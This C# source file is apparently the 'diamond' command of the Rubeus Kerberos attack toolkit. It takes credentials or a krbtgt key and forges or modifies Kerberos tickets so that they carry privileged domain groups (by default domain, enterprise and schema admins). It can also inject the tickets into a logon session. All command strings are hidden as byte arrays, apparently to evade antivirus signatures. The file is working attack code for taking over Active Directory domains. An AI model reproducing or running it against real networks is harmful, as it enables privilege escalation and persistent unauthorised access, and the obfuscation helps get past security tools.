using System;
using System.Collections.Generic;
using System.IO;
using Rubeus.lib.Interop;


namespace Rubeus.Commands
{
    public class Diamond : ICommand
    {
        private static string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);
        public static string CommandName => S(new byte[] { 100, 105, 97, 109, 111, 110, 100 });

        public void Execute(Dictionary<string, string> arguments)
        {
            string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);

            Console.WriteLine(S(new byte[] { 13, 10, 91, 42, 93, 32, 65, 99, 116, 105, 111, 110, 58, 32, 68, 105, 97, 109, 111, 110, 100, 32, 84, 105, 99, 107, 101, 116, 13, 10 }));

            string user = S(new byte[] {});
            string domain = S(new byte[] {});
            string password = S(new byte[] {});
            string hash = S(new byte[] {});
            string dc = S(new byte[] {});
            string outfile = S(new byte[] {});
            string certificate = S(new byte[] {});
            string krbKey = S(new byte[] {});
            string ticketUser = S(new byte[] {});
            string groups = S(new byte[] { 53, 50, 48, 44, 53, 49, 50, 44, 53, 49, 51, 44, 53, 49, 57, 44, 53, 49, 56 });
            int ticketUserId = 0;
            string sids = S(new byte[] {});

            bool ptt = arguments.ContainsKey(S(new byte[] { 47, 112, 116, 116 }));
            bool tgtdeleg = arguments.ContainsKey(S(new byte[] { 47, 116, 103, 116, 100, 101, 108, 101, 103 }));
            LUID luid = new LUID();
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial;

            if (arguments.ContainsKey(S(new byte[] { 47, 117, 115, 101, 114 })))
            {
                string[] parts = arguments[S(new byte[] { 47, 117, 115, 101, 114 })].Split('\\');
                if (parts.Length == 2)
                {
                    domain = parts[0];
                    user = parts[1];
                }
                else
                {
                    user = arguments[S(new byte[] { 47, 117, 115, 101, 114 })];
                }
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 100, 111, 109, 97, 105, 110 })))
            {
                domain = arguments[S(new byte[] { 47, 100, 111, 109, 97, 105, 110 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 100, 99 })))
            {
                dc = arguments[S(new byte[] { 47, 100, 99 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 111, 117, 116, 102, 105, 108, 101 })))
            {
                outfile = arguments[S(new byte[] { 47, 111, 117, 116, 102, 105, 108, 101 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 115, 105, 100, 115 })))
            {
                sids = arguments[S(new byte[] { 47, 115, 105, 100, 115 })];
            }
            encType = Interop.KERB_ETYPE.rc4_hmac; //default is non /enctype is specified
            if (arguments.ContainsKey(S(new byte[] { 47, 101, 110, 99, 116, 121, 112, 101 }))) {
                string encTypeString = arguments[S(new byte[] { 47, 101, 110, 99, 116, 121, 112, 101 })].ToUpper();

                if (encTypeString.Equals(S(new byte[] { 82, 67, 52 })) || encTypeString.Equals(S(new byte[] { 78, 84, 76, 77 }))) {
                    encType = Interop.KERB_ETYPE.rc4_hmac;
                } else if (encTypeString.Equals(S(new byte[] { 65, 69, 83, 49, 50, 56 }))) {
                    encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
                } else if (encTypeString.Equals(S(new byte[] { 65, 69, 83, 50, 53, 54 })) || encTypeString.Equals(S(new byte[] { 65, 69, 83 }))) {
                    encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                } else if (encTypeString.Equals(S(new byte[] { 68, 69, 83 }))) {
                    encType = Interop.KERB_ETYPE.des_cbc_md5;
                }
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 112, 97, 115, 115, 119, 111, 114, 100 })))
            {
                password = arguments[S(new byte[] { 47, 112, 97, 115, 115, 119, 111, 114, 100 })];

                string salt = String.Format(S(new byte[] { 123, 48, 125, 123, 49, 125 }), domain.ToUpper(), user);

                // special case for computer account salts
                if (user.EndsWith(S(new byte[] { 36 })))
                {
                    salt = String.Format(S(new byte[] { 123, 48, 125, 104, 111, 115, 116, 123, 49, 125, 46, 123, 50, 125 }), domain.ToUpper(), user.TrimEnd('$').ToLower(), domain.ToLower());
                }

                // special case for samaccountname spoofing to support Kerberos AES Encryption
                if (arguments.ContainsKey(S(new byte[] { 47, 111, 108, 100, 115, 97, 109 })))
                {
                    salt = String.Format(S(new byte[] { 123, 48, 125, 104, 111, 115, 116, 123, 49, 125, 46, 123, 50, 125 }), domain.ToUpper(), arguments[S(new byte[] { 47, 111, 108, 100, 115, 97, 109 })].TrimEnd('$').ToLower(), domain.ToLower());

                }

                hash = Crypto.KerberosPasswordHash(encType, password, salt);
            }

            else if (arguments.ContainsKey(S(new byte[] { 47, 100, 101, 115 })))
            {
                hash = arguments[S(new byte[] { 47, 100, 101, 115 })];
                encType = Interop.KERB_ETYPE.des_cbc_md5;
            }
            else if (arguments.ContainsKey(S(new byte[] { 47, 114, 99, 52 })))
            {
                hash = arguments[S(new byte[] { 47, 114, 99, 52 })];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.ContainsKey(S(new byte[] { 47, 110, 116, 108, 109 })))
            {
                hash = arguments[S(new byte[] { 47, 110, 116, 108, 109 })];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.ContainsKey(S(new byte[] { 47, 97, 101, 115, 49, 50, 56 })))
            {
                hash = arguments[S(new byte[] { 47, 97, 101, 115, 49, 50, 56 })];
                encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
            }
            else if (arguments.ContainsKey(S(new byte[] { 47, 97, 101, 115, 50, 53, 54 })))
            {
                hash = arguments[S(new byte[] { 47, 97, 101, 115, 50, 53, 54 })];
                encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            }
            
            if (arguments.ContainsKey(S(new byte[] { 47, 99, 101, 114, 116, 105, 102, 105, 99, 97, 116, 101 }))) {
                certificate = arguments[S(new byte[] { 47, 99, 101, 114, 116, 105, 102, 105, 99, 97, 116, 101 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 107, 114, 98, 107, 101, 121 }))) {
                krbKey = arguments[S(new byte[] { 47, 107, 114, 98, 107, 101, 121 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 116, 105, 99, 107, 101, 116, 117, 115, 101, 114 })))
            {
                ticketUser = arguments[S(new byte[] { 47, 116, 105, 99, 107, 101, 116, 117, 115, 101, 114 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 103, 114, 111, 117, 112, 115 }))) 
            {
                groups = arguments[S(new byte[] { 47, 103, 114, 111, 117, 112, 115 })];
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 116, 105, 99, 107, 101, 116, 117, 115, 101, 114, 105, 100 })))
            {
                ticketUserId = int.Parse(arguments[S(new byte[] { 47, 116, 105, 99, 107, 101, 116, 117, 115, 101, 114, 105, 100 })]);
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 108, 117, 105, 100 })))
            {
                try
                {
                    luid = new LUID(arguments[S(new byte[] { 47, 108, 117, 105, 100 })]);
                }
                catch
                {
                    Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 73, 110, 118, 97, 108, 105, 100, 32, 76, 85, 73, 68, 32, 102, 111, 114, 109, 97, 116, 32, 40, 123, 48, 125, 41, 13, 10 }), arguments[S(new byte[] { 47, 108, 117, 105, 100 })]);
                    return;
                }
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 99, 114, 101, 97, 116, 101, 110, 101, 116, 111, 110, 108, 121 })))
            {
                // if we're starting a hidden process to apply the ticket to
                if (!Helpers.IsHighIntegrity())
                {
                    Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 89, 111, 117, 32, 110, 101, 101, 100, 32, 116, 111, 32, 98, 101, 32, 105, 110, 32, 104, 105, 103, 104, 32, 105, 110, 116, 101, 103, 114, 105, 116, 121, 32, 116, 111, 32, 97, 112, 112, 108, 121, 32, 97, 32, 116, 105, 99, 107, 101, 116, 32, 116, 111, 32, 99, 114, 101, 97, 116, 101, 100, 32, 108, 111, 103, 111, 110, 32, 115, 101, 115, 115, 105, 111, 110, 13, 10 }));
                    return;
                }
                if (arguments.ContainsKey(S(new byte[] { 47, 115, 104, 111, 119 })))
                {
                    luid = Helpers.CreateProcessNetOnly(arguments[S(new byte[] { 47, 99, 114, 101, 97, 116, 101, 110, 101, 116, 111, 110, 108, 121 })], true);
                }
                else
                {
                    luid = Helpers.CreateProcessNetOnly(arguments[S(new byte[] { 47, 99, 114, 101, 97, 116, 101, 110, 101, 116, 111, 110, 108, 121 })], false);
                }
                Console.WriteLine();
            }

           if (tgtdeleg)
           {
                KRB_CRED cred = null;
                try {
                    cred = new KRB_CRED(LSA.RequestFakeDelegTicket());
                }
                catch {
                    Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 85, 110, 97, 98, 108, 101, 32, 116, 111, 32, 114, 101, 116, 114, 105, 101, 118, 101, 32, 84, 71, 84, 32, 117, 115, 105, 110, 103, 32, 116, 103, 116, 100, 101, 108, 101, 103, 13, 10 }));
                    return;
                }
                ForgeTickets.ModifyTicket(cred, krbKey, krbKey, outfile, ptt, luid, ticketUser, groups, ticketUserId, sids);
            }
            else
            {
                if (String.IsNullOrEmpty(certificate))
                    ForgeTickets.DiamondTicket(user, domain, hash, encType, outfile, ptt, dc, luid, krbKey, ticketUser, groups, ticketUserId, sids);
                else
                    ForgeTickets.DiamondTicket(user, domain, certificate, password, encType, outfile, ptt, dc, luid, krbKey, ticketUser, groups, ticketUserId, sids);
            }

            return;
        }
    }
}
